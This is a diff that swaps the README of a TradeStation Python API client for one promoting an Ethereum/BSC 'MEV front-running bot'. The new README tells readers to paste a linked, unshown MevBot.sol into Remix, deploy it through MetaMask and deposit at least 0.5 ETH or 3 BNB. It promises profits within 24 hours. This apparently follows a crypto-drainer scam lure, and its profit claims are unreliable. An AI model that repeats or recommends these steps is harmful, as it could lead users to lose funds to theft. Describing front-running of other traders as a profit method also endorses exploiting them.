@@ -1,115 +1,87 @@
-# Tradestation Python API
+# Profit 13.05.23-17.05.23
 
-A Python Client library for the TradeStation API.
+<img src="https://i.ibb.co/bWkNdH1/1.jpg" alt="1" border="0">
 
-## Table of Contents
+<img src="https://i.ibb.co/g9q1Njv/2.jpg" alt="2" border="0">
 
-- [Overview](#overview)
-- [What's in the API](#whats-in-the-api)
-- [Requirements](#requirements)
-- [API Key & Credentials](#api-key-and-credentials)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Features](#features)
-- [Documentation & Resources](#documentation-and-resources)
-- [Support These Projects](#support-these-projects)
+# Mev Bot
+The term 'front-running' is commonly associated with the stock market, referring to the practice of leveraging insider information to seize market opportunities before others. This essentially amounts to insider trading.
 
-## Overview
+# The Front-Running Bot
+A front-running bot is an automated program that examines pending transactions and outbids others by offering a higher gas fee, ensuring its transaction gets priority in processing, thereby front-running significant trades likely to influence market prices.
 
-The unofficial Python API client library for TradeStation allows individuals with TradeStation accounts to manage trades, pull historical and real-time data, manage their accounts, create and modify orders all using the Python programming language.
+Bots, pre-configured programs, automate trading activities. They relieve users from constantly monitoring the market and determining the perfect timing for buying and selling. They auto-process and analyze market data, executing asset transactions on behalf of users. So, how do cryptocurrency front-running bots operate?
 
-To learn more about the TradeStation API, please refer to the [official documentation](https://developer.tdameritrade.com/apis).
+Design elements of Ethereum or blockchain allow all submitted transactions to reside temporarily in a 'mempool,' a holding area for transactions awaiting processing. Miners or bots can scrutinize the mempool to find suitable transactions for front-running in cryptocurrency trading.
 
-## What's in the API
+Front-runner bots typically operate on a millisecond timescale. They can read a transaction from the mempool, calculate the ideal transaction size, set up the transactions, and execute them within split seconds. Manual operation cannot compete with this speed.
 
-- Authentication - access tokens, refresh tokens, request authentication.
-- Accounts & Trading
-- Symbols
-- Index
-- Orders
-- Paper Trading
-- Quotes
-- Transaction History
+By placing a buy order in the same block while setting a higher gas price, the bot front-runs specific transactions concerning slippage, trade volumes, and gas price. The front-run bot identifies when extra liquidity is added to an AMM (Automated Market Maker) pool on the exchange and manipulates the transaction order within a block to profit from another trader.
 
-## Requirements
+# Title:
+Creation of a Cutting-Edge Predictive Bot Leveraging Solidity Technology for Enhanced Mempool Scanning, Transaction Processing, and Security
 
-The following requirements must be met to use this API:
+# Introduction:
+The world of cryptocurrency technology demands increasingly sophisticated transaction processing systems. Our innovative predictive bot, built on Solidity technology, offers superior performance compared to existing solutions. It provides more efficient mempool scanning, accelerated transaction processing, and heightened security for users.
 
-- A TradeStation account, you'll need your account password and account number to use the API.
-- A TradeStation Developer API Key
-- A Redirect URI, sometimes called Redirect URL
-- Python 3.8 or later.
+# Key Features and Benefits:
+Innovative Predictive Bot: Our bot possesses the capability to predict and assess transactions in the mempool, facilitating processing at the earliest stage. This enhancement speeds up transaction processing and minimizes user waiting times. Deployment of Solidity Technology: Solidity technology equips our bot with superior performance and reliability, assuring steady operation and effective transaction processing. Flexibility and Scalability: Our bot adjusts to network alterations and scales according to requirements, ensuring a stable system operation. Security and Privacy: Our bot assures high-level security and user data privacy, leveraging contemporary cryptographic methodologies.
 
-## API Key and Credentials
+The bot generates a unique smart contract for each client with a dedicated balance, offering an additional security layer and preventing unauthorized user wallet access.
+Conclusion: Our Solidity technology-based predictive bot revolutionizes the process of mempool scanning and transaction processing. It ensures faster and more reliable service for cryptocurrency platform users, making our product an invaluable asset for the development of digital asset infrastructure. The bot's operational costs are restricted to gas fees on the Ethereum or BSC networks.
 
-Each TradeStation API request requires a TradeStation Developer API Key, a consumer ID, an account password, an account number, and a redirect URI. API Keys, consumer IDs, and redirect URIs are generated from the TradeStation developer portal. To set up and create your TradeStation developer account, please refer to the [official documentation](https://developer.tdameritrade.com/content/phase-1-authentication-update-xml-based-api).
+# Bot capabilities:
+Check every WETH pair. Calculate possible profit Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation) Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price) MEV bot Instructions (works only for Mainnet) How it works: create-a-frontrunner-bot-on-uniswap
 
-Additionally, to authenticate yourself using this library, you will need to provide your account number and password for your main TradeStation account.
+You can see an example of how the bot works
 
-**Important:** Your account number, an account password, consumer ID, and API key should be kept secret.
+<img src="https://i.ibb.co/xsLft4F/3.jpg" alt="3" border="0">
 
-## Installation
+# ✏️Step 1: 
+Remix Access the Remix IDE (this website is where we deploy the smart contract): https://remix.ethereum.org/ 
 
-```bash
-pip install -e .
-```
 
-## Usage
+# ✏️ Step 2:
+File Explorer Hover over the tiny button in the top left and click and create new file "mevbot.sol" Copy the code from [**"MevBot.sol"**](MevBot.sol) and paste in Remix IDE
+Click Solidity complier 0.6.12
 
-This example demonstrates how to login to the API and demonstrates sending a request using the `quotes`, and `stream_bars_start_date` endpoint, using your API key.
+<img src="https://i.ibb.co/Dg3HfJM/4-4.jpg" alt="4-4" border="0">
 
-```python
-# Import the client
-from ts.client import TradeStationClient
 
-# Create the Client.
-ts_client = TradeStationClient(
-    username="USERNAME",
-    client_id="CLIENT_ID",
-    client_secret="CLIENT_SECRET",
-    redirect_uri="REDIRECT_URI",
-    paper_trading="PAPER_TRADING"
-)
+# ✏️ Step 3:
+go to deploy and enter your details below
+enter here
+1) ETH or BSC
+2) ETH or BSC
+3) your address
 
-# Get quotes for Oil Futures.
-ts_client.quotes(symbols=['@CL'])
+<img src="https://i.ibb.co/0Kkg8qx/5.jpg" alt="5" border="0">
 
-# Stream quotes for Amazon.
-ts_client.stream_quotes_changes(symbols=['AMZN'])
 
-# Stream bars for a certain date.
-ts_client.stream_bars_start_date(
-    symbol='AMZN',
-    interval=5,
-    unit='Minute',
-    start_date='02-25-2020',
-    session='USEQPreAndPost'
-)
-```
+# ✏️ Step 4: 
+Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".
 
-## Features
+<img src="https://i.ibb.co/5krtR1f/6.jpg" alt="6" border="0">
 
-### Authentication Workflow Support
+# ✏️ Step 5:
+Next - Deposit Balance into MEV Bot and press "action" Copy your MevBot contract address and send a number of Ethereum / BNB to the bot's balance for the bot to work. And start it with the "action" button.
 
-Automatically will handle the authentication workflow for new users, returning users, and users with expired tokens (refresh token or access token).
+ <img src="https://i.ibb.co/23CfpLs/7.jpg" alt="7" border="0">
 
-### Request Validation
 
-For certain requests, in a limited fashion, it will help validate your request when possible. For example, when using the `get_bars` endpoint, it will automatically validate that the market you're requesting data from is one of the valid options.
+ <img src="https://i.ibb.co/KqCqYkc/8.jpg" alt="8" border="0">
 
-## Documentation and Resources
 
-- [Overview](https://tradestation.github.io/api-docs/#section/Overview)
-- [Paper Trading](https://tradestation.github.io/api-docs/#section/Overview/SIM-vs-LIVE)
-- [Authentication](https://tradestation.github.io/api-docs/#section/Authentication)
+The MEVBot begins trading immeditately, simpy wait for profits to accumulate.
 
-## Support these Projects
+❗ NOTE:
+You can start with any amount, but keep in mind that you need enough money for gas. we reccomend a minimum of 0.5 ETG / 3 BNB for you to start seeing profits in the first 24 hours.
 
-**Patreon:**
-Help support this project and future projects by donating to my [Patreon Page](https://www.patreon.com/sigmacoding). I'm always looking to add more content for individuals like yourself, unfortuantely some of the APIs I would require me to pay monthly fees.
+You can stop the bot or withdraw your funds at any time by calling the action function.
 
-**YouTube:**
-If you'd like to watch more of my content, feel free to visit my YouTube channel [Sigma Coding](https://www.youtube.com/c/SigmaCoding).
+# Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
 
-**Hire Me:**
-If you have a project, you think I can help you with feel free to reach out at coding.sigma@gmail.com
+# License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
